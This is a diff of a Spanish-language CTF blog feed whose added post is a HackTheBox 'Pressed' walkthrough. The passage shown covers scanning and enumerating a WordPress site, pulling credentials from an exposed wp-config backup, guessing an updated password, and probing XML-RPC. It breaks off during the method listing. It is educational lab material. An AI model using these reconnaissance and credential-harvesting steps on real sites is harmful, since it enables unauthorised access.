@@ -1,5 +1,1189 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-22T13:38:31-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Jeeves (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html" rel="alternate" type="text/html" title="HackTheBox - Jeeves (medium)" /><published>2024-06-22T00:00:00-06:00</published><updated>2024-06-22T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-24T17:23:50-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Pressed (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/06/24/pressed.html" rel="alternate" type="text/html" title="HackTheBox - Pressed (hard)" /><published>2024-06-24T00:00:00-06:00</published><updated>2024-06-24T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/06/24/pressed</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/06/24/pressed.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/933a05448c07bbdc08c3dcc1fe75aea6.png" />
+</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> 10.10.11.142 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-24 11:42 CST
+Nmap scan report <span class="k">for </span>10.10.11.142
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: UHC Jan Finals &amp;#8211<span class="p">;</span> New Month, New Boxes
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: WordPress 5.9
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.11.142
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-24 11:46 CST
+Nmap scan report <span class="k">for </span>10.10.11.142
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2
+|   /: WordPress version: 5.9
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>
+    <p>El escaneo de <strong>Nmap</strong> solo nos reporta 1 puerto abierto que esta corriendo un servicio <code class="language-plaintext highlighter-rouge">http</code> y esta usando un gestor de contenido que es <code class="language-plaintext highlighter-rouge">Wordpress</code>.</p>
+  </li>
+  <li>
+    <p>Si investigamos la versión actual de <code class="language-plaintext highlighter-rouge">Wordpress</code> es la 6.5 <a href="https://www.nexcess.net/blog/wordpress-version/#:~:text=What%20is%20the%20WordPress%20current,site%20editor%20changes%2C%20and%20more.">https://www.nexcess.net/blog/wordpress-version/#:~:text=What%20is%20the%20WordPress%20current,site%20editor%20changes%2C%20and%20more.</a>.</p>
+  </li>
+  <li>
+    <p>Esta es la pagina web.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/1.png" />
+</p>
+
+<ul>
+  <li>Si damos click en el texto subrayado <code class="language-plaintext highlighter-rouge">UHC January Finals Under Way</code> se nos muestra lo siguiente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/2.png" />
+</p>
+
+<ul>
+  <li>Vamos agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para ver si cambia algo en la web.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo echo</span> <span class="s2">"10.10.11.142 pressed.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.142 pressed.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Pero vemos lo mismo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/3.png" />
+</p>
+
+<ul>
+  <li>Vamos a llenar esa información para ver que es lo que pasa.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/4.png" />
+</p>
+
+<ul>
+  <li>Bueno al principio no paso nada pero cuando volví a hacerlo me salió este mensaje.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/5.png" />
+</p>
+
+<ul>
+  <li>Sabemos que existen las ruta típicas de <code class="language-plaintext highlighter-rouge">WordPress</code> pero vamos a hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos otra ruta interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap dirsearch <span class="nt">-u</span> http://10.10.11.142
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/miguel/Hackthebox/Pressed/nmap/reports/http_10.10.11.142/_24-06-24_12-01-54.txt
+
+Target: http://10.10.11.142/
+
+<span class="o">[</span>12:01:54] Starting:
+<span class="o">[</span>12:02:04] 403 -  277B  - /.ht_wsr.txt
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.sample
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess_extra
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.orig
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess_orig
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.save
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccessBAK
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.bak1
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccessOLD
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccessOLD2
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess_sc
+<span class="o">[</span>12:02:05] 403 -  277B  - /.httr-oauth
+<span class="o">[</span>12:02:05] 403 -  277B  - /.html
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htm
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htpasswd_test
+<span class="o">[</span>12:02:05] 403 -  277B  - /.htpasswds
+<span class="o">[</span>12:02:11] 403 -  277B  - /.php
+<span class="o">[</span>12:02:18] 200 -    4KB - /.wp-config.php.swp
+<span class="o">[</span>12:04:18] 301 -    0B  - /index.php  -&gt;  http://10.10.11.142/
+<span class="o">[</span>12:04:19] 404 -   21KB - /index.php/login/
+<span class="o">[</span>12:04:29] 200 -    7KB - /license.txt
+<span class="o">[</span>12:05:19] 200 -    3KB - /readme.html
+<span class="o">[</span>12:05:26] 403 -  277B  - /server-status
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vemos que en una ruta hay un archivo <code class="language-plaintext highlighter-rouge">.swp</code> <a href="https://filext.com/es/extension-de-archivo/SWP">https://filext.com/es/extension-de-archivo/SWP</a>.</p>
+  </li>
+  <li>
+    <p>Si enumeramos con <code class="language-plaintext highlighter-rouge">wpscan</code> vemos que ya nos dice que el <code class="language-plaintext highlighter-rouge">XML-RPC</code> esta activado.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap wpscan <span class="nt">--url</span> http://10.10.11.142
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.11.142/ [10.10.11.142]
+[+] Started: Mon Jun 24 12:40:59 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.11.142/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.11.142/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.11.142/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.11.142/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.11.142/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
+ |  - http://10.10.11.142/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
+
+[+] WordPress theme in use: retrogeek
+ | Location: http://10.10.11.142/wp-content/themes/retrogeek/
+ | Last Updated: 2024-04-26T00:00:00.000Z
+ | Readme: http://10.10.11.142/wp-content/themes/retrogeek/README.txt
+ | [!] The version is out of date, the latest version is 0.7
+ | Style URL: http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42
+ | Style Name: RetroGeek
+ | Style URI: https://tuxlog.de/retrogeek/
+ | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
+ | Author: tuxlog
+ | Author URI: https://tuxlog.de/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 0.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42, Match: '</span>Version: 0.5<span class="s1">'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 &lt;=====================================================&gt; (137 / 137) 100.00% Time: 00:00:04
+
+[i] Config Backup(s) Identified:
+
+[!] http://10.10.11.142/wp-config.php.bak
+ | Found By: Direct Access (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Jun 24 12:41:23 2024
+[+] Requests Done: 173
+[+] Cached Requests: 5
+[+] Data Sent: 44.019 KB
+[+] Data Received: 126.531 KB
+[+] Memory used: 253.621 MB
+[+] Elapsed time: 00:00:23
+</span></code></pre></div></div>
+
+<ul>
+  <li>Vemos un <code class="language-plaintext highlighter-rouge">wp-config.php.bak</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap wget http://10.10.11.142/wp-config.php.bak
+<span class="nt">--2024-06-24</span> 12:42:38--  http://10.10.11.142/wp-config.php.bak
+Connecting to 10.10.11.142:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3194 <span class="o">(</span>3.1K<span class="o">)</span> <span class="o">[</span>application/x-trash]
+Saving to: ‘wp-config.php.bak’
+
+wp-config.php.bak                100%[<span class="o">==========================================================&gt;]</span>   3.12K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.005s
+
+2024-06-24 12:42:38 <span class="o">(</span>638 KB/s<span class="o">)</span> - ‘wp-config.php.bak’ saved <span class="o">[</span>3194/3194]
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>wp-config.php.bak
+&lt;?php
+/<span class="k">**</span>
+ <span class="k">*</span> The base configuration <span class="k">for </span>WordPress
+ <span class="k">*</span>
+ <span class="k">*</span> The wp-config.php creation script uses this file during the installation.
+ <span class="k">*</span> You don<span class="s1">'t have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( '</span>DB_NAME<span class="s1">', '</span>wordpress<span class="s1">' );
+
+/** Database username */
+define( '</span>DB_USER<span class="s1">', '</span>admin<span class="s1">' );
+
+/** Database password */
+define( '</span>DB_PASSWORD<span class="s1">', '</span>uhc-jan-finals-2021<span class="s1">' );
+
+/** Database hostname */
+define( '</span>DB_HOST<span class="s1">', '</span>localhost<span class="s1">' );
+
+/** Database charset to use in creating database tables. */
+define( '</span>DB_CHARSET<span class="s1">', '</span>utf8mb4<span class="s1">' );
+
+/** The database collate type. Don'</span>t change this <span class="k">if in </span>doubt. <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'DB_COLLATE'</span>, <span class="s1">''</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span><span class="c">#@+</span>
+ <span class="k">*</span> Authentication unique keys and salts.
+ <span class="k">*</span>
+ <span class="k">*</span> Change these to different unique phrases! You can generate these using
+ <span class="k">*</span> the <span class="o">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="o">}</span><span class="nb">.</span>
+ <span class="k">*</span>
+ <span class="k">*</span> You can change these at any point <span class="k">in </span><span class="nb">time </span>to invalidate all existing cookies.
+ <span class="k">*</span> This will force all <span class="nb">users </span>to have to log <span class="k">in </span>again.
+ <span class="k">*</span>
+ <span class="k">*</span> @since 2.6.0
+ <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'AUTH_KEY'</span>,         <span class="s1">'3MYXll40,8gfj_jX4!3J(278f1(SGEZ+v]#w]Bu&lt;PrstLLHEZig,MJB#t E2pU2t'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'SECURE_AUTH_KEY'</span>,  <span class="s1">'QPkQ%%h&amp;5$3$C;Z}2N!LKz.O 57i2U.582Gy{C=$XV_(jJz~3gC=*nKP//{v{?n&lt;'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'LOGGED_IN_KEY'</span>,    <span class="s1">'rp}RE/3-_3OF%./6PH` 1zbCy#H22NRH,ETR(c2*Qlu&amp;W&gt;lW|::4T[iFx%W|%[hA'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'NONCE_KEY'</span>,        <span class="s1">'#%s&amp;zIE/mSuvN{+2]^n;21]|u;gmP6!-ihyCn91j{/.KRGbg8}{3C%kZ#$(i&amp;bc-'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'AUTH_SALT'</span>,        <span class="s1">',7BVMi:h`][Q/3j8tHN*EjKk,jY|+hm.3OnjYS A$ArIx7B z]WzLJ$Tc7&lt;/s`td'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'SECURE_AUTH_SALT'</span>, <span class="s1">']s_RJ,%OLa.}_8wP Qeu9WJUhJ2Zd2I%&gt;T5R#f{8op9:Hn??}7{ZJ*.K.t/{lVl0'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'LOGGED_IN_SALT'</span>,   <span class="s1">'wwQj(p&amp;1I8zAK!2lhR[xg.Vt`qeh|2R}HMz?~TuQ9QE*@iy?@*?pDV;[4BL9*n#W'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'NONCE_SALT'</span>,       <span class="s1">'[Wv%%EDN&lt;b/a_&lt;/u|snqMQ q)xPW8GyB4WAw f+1k2|IFbu*7#U(g-# l{Kw n6Z'</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span><span class="c">#@-*/</span>
+
+/<span class="k">**</span>
+ <span class="k">*</span> WordPress database table prefix.
+ <span class="k">*</span>
+ <span class="k">*</span> You can have multiple installations <span class="k">in </span>one database <span class="k">if </span>you give each
+ <span class="k">*</span> a unique prefix. Only numbers, letters, and underscores please!
+ <span class="k">*</span>/
+<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>
+
+/<span class="k">**</span>
+ <span class="k">*</span> For developers: WordPress debugging mode.
+ <span class="k">*</span>
+ <span class="k">*</span> Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
+ <span class="k">*</span> It is strongly recommended that plugin and theme developers use WP_DEBUG
+ <span class="k">*</span> <span class="k">in </span>their development environments.
+ <span class="k">*</span>
+ <span class="k">*</span> For information on other constants that can be used <span class="k">for </span>debugging,
+ <span class="k">*</span> visit the documentation.
+ <span class="k">*</span>
+ <span class="k">*</span> @link https://wordpress.org/support/article/debugging-in-wordpress/
+ <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'WP_DEBUG'</span>, <span class="nb">false</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">*</span> Add any custom values between this line and the <span class="s2">"stop editing"</span> line. <span class="k">*</span>/
+
+
+
+/<span class="k">*</span> That<span class="s1">'s all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( '</span>ABSPATH<span class="s1">' ) ) {
+	define( '</span>ABSPATH<span class="s1">', __DIR__ . '</span>/<span class="s1">' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . '</span>wp-settings.php<span class="s1">';
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">admin:uhc-jan-finals-2021</code></p>
+  </li>
+  <li>
+    <p>Si probamos las credenciales vemos que son incorrectas.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/xd.png" />
+</p>
+
+<ul>
+  <li>Si cambiamos de 2021 a 2022 nos muestra esto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/zi.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Con esto sabemos que la credencial es valida.</p>
+  </li>
+  <li>
+    <p>Podemos enumerar mediante este script <code class="language-plaintext highlighter-rouge">php</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.142/xmlrpc.php
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;-32700&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;parse error. not well formed&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Hay una ruta llamada <code class="language-plaintext highlighter-rouge">/uploads</code> pero no hay nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/6.png" />
+</p>
+
+<ul>
+  <li>
+    <p><a href="https://www.hostinger.mx/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/">https://www.hostinger.mx/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a ver si esta activo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://10.10.11.142/xmlrpc.php
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
